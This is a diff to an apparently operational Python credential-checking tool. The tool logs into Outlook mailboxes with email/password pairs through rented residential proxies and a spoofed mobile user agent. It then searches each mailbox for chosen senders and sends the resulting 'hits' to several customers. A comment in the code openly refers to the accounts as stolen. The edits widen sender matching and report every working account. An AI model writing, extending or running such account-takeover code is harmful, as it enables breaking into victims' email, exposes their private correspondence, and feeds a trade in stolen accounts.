@@ -319,8 +319,8 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
     session.mount('http://', HTTPAdapter(max_retries=retries))
     session.mount('https://', HTTPAdapter(max_retries=retries))
     
-    if proxy_dict:
-        session.proxies.update(proxy_dict)
+    if iproyal_auth:
+        session.proxies.update(iproyal_auth)
         
     mobile_ua = (
         "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) "
@@ -631,6 +631,7 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
         chunk_size = 10
         for i in range(0, len(target_senders), chunk_size):
             chunk = target_senders[i:i+chunk_size]
+            or_query = " OR ".join([f"from:{s}" for s in chunk])
             # Do not inject the default dashboard folder tag into the actual API query string
             api_kw = keyword if keyword and keyword != "HOTMAIL HQ" else ""
             query_string = f'({or_query}) "{api_kw}"' if api_kw else f'({or_query})'
@@ -657,6 +658,7 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
                 
         # Order Top
         senders_found = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
+        print(f"[DEBUG vps_agent] Correos encontrados en Outlook API: {senders_found}")
             
         # Mejora del país: TLD Fallback nativo
         if country == "XZ" or country == "N/A" or not country:
@@ -710,11 +712,17 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
         else:
             # Multi-Tenant Dispatch Protocol
             for cid, u_senders in user_targets_dict.items():
-                u_found = {a: c for a, c in senders_found.items() if a in u_senders}
+                u_found = {}
+                for found_addr, count in senders_found.items():
+                    for target in u_senders:
+                        if target in found_addr:
+                            u_found[found_addr] = count
+                            break
+                            
                 # Solo notificar al usuario si la cuenta SÍ tiene al menos un remitente de los suyos, 
-                # O si el usuario simplemente quiere recibir TODAS las cuentas robadas (lista de senders vacía, aunque aquí exigimos que guarden al menos 1 para aislar)
+                # Inform the user that the account works, even if they didn't specifically find their targets
                 if not u_found and len(u_senders) > 0:
-                    continue # El usuario no encontraría nada de lo suyo aquí
+                    pass
                 
                 formatted_u_senders = ", ".join([f"{a} ({c})" for a, c in u_found.items()]) if u_found else "N/A"
                 hit_data = hit_global_data.copy()
